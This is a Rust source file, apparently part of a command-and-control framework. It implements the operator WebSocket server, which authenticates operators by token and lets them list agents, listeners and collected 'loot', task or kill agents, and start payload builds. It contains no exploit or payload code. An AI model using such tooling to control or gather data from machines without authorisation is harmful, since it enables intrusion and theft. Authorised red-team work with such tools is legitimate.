//! Operator WebSocket server — TUI clients connect here for real-time C2.

use crate::build;
use crate::state::AppState;
use axum::{
    extract::{
        ws::{Message, WebSocket, WebSocketUpgrade},
        State,
    },
    response::IntoResponse,
    routing::get,
    Router,
};
use futures::{SinkExt, StreamExt};
use oxide_common::protocol::{OpMessage, SrvMessage};
use tracing::{error, info, warn};

pub struct Server {
    state: AppState,
}

impl Server {
    pub fn new(state: AppState) -> Self {
        Server { state }
    }

    pub async fn run(self, host: &str, port: u16) -> anyhow::Result<()> {
        let app = Router::new()
            .route("/ws", get(ws_handler))
            .with_state(self.state);

        let addr: std::net::SocketAddr = format!("{host}:{port}").parse()?;
        info!("Operator listener on ws://{addr}/ws");

        let listener = tokio::net::TcpListener::bind(addr).await?;
        axum::serve(listener, app).await?;
        Ok(())
    }
}

async fn ws_handler(
    upgrade: WebSocketUpgrade,
    State(state): State<AppState>,
) -> impl IntoResponse {
    upgrade.on_upgrade(move |ws| handle_ws(ws, state))
}

async fn handle_ws(ws: WebSocket, state: AppState) {
    let (mut tx, mut rx) = ws.split();

    // Send welcome
    let ver = env!("CARGO_PKG_VERSION").to_string();
    let welcome = serde_json::to_string(&SrvMessage::Welcome { version: ver }).unwrap();
    let _ = tx.send(Message::Text(welcome)).await;

    // Wait for Auth
    let token = {
        let inner = state.0.read().await;
        inner.config.operator_token.clone()
    };

    let authed = match rx.next().await {
        Some(Ok(Message::Text(raw))) => {
            match serde_json::from_str::<OpMessage>(&raw) {
                Ok(OpMessage::Auth { token: t }) if t == token => true,
                _ => false,
            }
        }
        _ => false,
    };

    if !authed {
        let msg = serde_json::to_string(&SrvMessage::AuthFail {
            reason: "bad token".into(),
        })
        .unwrap();
        let _ = tx.send(Message::Text(msg)).await;
        return;
    }

    let auth_ok = serde_json::to_string(&SrvMessage::AuthOk).unwrap();
    if tx.send(Message::Text(auth_ok)).await.is_err() {
        return;
    }
    info!("Operator authenticated");

    // Subscribe to broadcast
    let mut bcast_rx = {
        let inner = state.0.read().await;
        inner.broadcast.subscribe()
    };

    loop {
        tokio::select! {
            // Forward server events to operator
            msg = bcast_rx.recv() => {
                match msg {
                    Ok(srv_msg) => {
                        if let Ok(json) = serde_json::to_string(&srv_msg) {
                            if tx.send(Message::Text(json)).await.is_err() { break; }
                        }
                    }
                    Err(_) => {}
                }
            }

            // Handle incoming operator commands
            incoming = rx.next() => {
                match incoming {
                    Some(Ok(Message::Text(raw))) => {
                        match serde_json::from_str::<OpMessage>(&raw) {
                            Ok(op) => handle_op(op, &state, &mut tx).await,
                            Err(e) => warn!("bad op msg: {e}"),
                        }
                    }
                    Some(Ok(Message::Close(_))) | None => {
                        info!("Operator disconnected");
                        break;
                    }
                    Some(Err(e)) => {
                        error!("ws error: {e}");
                        break;
                    }
                    _ => {}
                }
            }
        }
    }
}

async fn handle_op(
    op: OpMessage,
    state: &AppState,
    tx: &mut futures::stream::SplitSink<WebSocket, Message>,
) {
    let reply = match op {
        OpMessage::ListAgents => {
            let inner = state.0.read().await;
            let list = inner.agents.values().cloned().collect();
            SrvMessage::Agents { list }
        }
        OpMessage::ListListeners => {
            let inner = state.0.read().await;
            let list = inner.listeners.values().cloned().collect();
            SrvMessage::Listeners { list }
        }
        OpMessage::ListLoot => {
            let inner = state.0.read().await;
            let entries = inner.loot.clone();
            SrvMessage::Loot { entries }
        }
        OpMessage::TaskAgent { agent_id, task } => {
            state.queue_task(agent_id, task).await;
            return;
        }
        OpMessage::KillAgent { agent_id } => {
            let task = oxide_common::types::AgentTask {
                id:      uuid::Uuid::new_v4(),
                command: "kill".into(),
                args:    vec![],
            };
            state.queue_task(agent_id, task).await;
            return;
        }
        OpMessage::CreateListener { config } => {
            let mut inner = state.0.write().await;
            let info = oxide_common::types::ListenerInfo {
                config: config.clone(),
                status: oxide_common::types::ListenerStatus::Stopped,
                agents: 0,
            };
            inner.listeners.insert(config.id, info);
            // Actual start happens via listener manager watching state
            return;
        }
        OpMessage::StopListener { id } => {
            state.listener_offline(id).await;
            return;
        }
        OpMessage::GeneratePayload { options } => {
            let state_clone = state.clone();
            tokio::spawn(async move {
                build::run(options, state_clone).await;
            });
            return;
        }
        _ => return,
    };

    if let Ok(json) = serde_json::to_string(&reply) {
        let _ = tx.send(Message::Text(json)).await;
    }
}
